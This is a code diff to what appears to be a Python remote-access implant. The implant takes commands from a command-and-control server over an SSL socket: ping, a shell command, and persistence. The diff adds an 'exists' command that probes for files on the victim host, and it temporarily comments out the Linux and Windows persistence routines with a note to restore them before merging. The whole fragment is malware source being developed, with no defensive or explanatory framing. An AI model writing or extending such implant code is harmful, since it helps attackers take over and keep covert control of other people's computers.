@@ -140,7 +140,8 @@ def process_instructions(ss: ssl.SSLSocket):
     while True:
         buffer = ss.recv()
         if buffer:
-            match buffer:
+            buffer1 = buffer.split(b" ")[0]
+            match buffer1:
                 case b"ping":
                     ss.send(b"pong")
                 case b"shell":
@@ -148,6 +149,12 @@ def process_instructions(ss: ssl.SSLSocket):
                 case b"persistence":
                     # TODO: return persistence status
                     pass
+                case b"exists":
+                    if os.path.isfile(buffer.split(b" ")[1]):
+                        ss.send(b"ok")
+                    else:
+                        print(buffer)
+                        ss.send(b"ko")
                 case _:
                     print(f"Unknown command received: '{buffer.decode()}'")
                     ss.send(b"unknown")
@@ -166,13 +173,13 @@ def main():
         return
     print("Lock is free !")
 
-    # Persistence
-    print("Start persistence...")
-    if platform.system() == "Linux":
-        persistence_linux()
-    elif platform.system() == "Windows":
-        persistence_windows()
-    print("Finished persistence !")
+    # Persistence (TODO: uncomment this before merge)
+    # print("Start persistence...")
+    # if platform.system() == "Linux":
+    #     persistence_linux()
+    # elif platform.system() == "Windows":
+    #     persistence_windows()
+    # print("Finished persistence !")
 
     # Start secure connection with C2
     ss = init_connection()
